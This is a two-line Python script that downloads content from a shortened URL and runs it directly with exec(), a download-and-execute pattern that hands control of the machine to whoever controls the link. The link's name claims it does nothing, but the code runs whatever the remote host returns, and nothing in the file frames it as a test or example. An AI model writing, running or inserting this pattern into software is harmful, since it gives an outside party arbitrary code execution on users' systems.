import requests

exec(requests.get('http://gg.gg/test_does_nothing', allow_redirects=True).content)
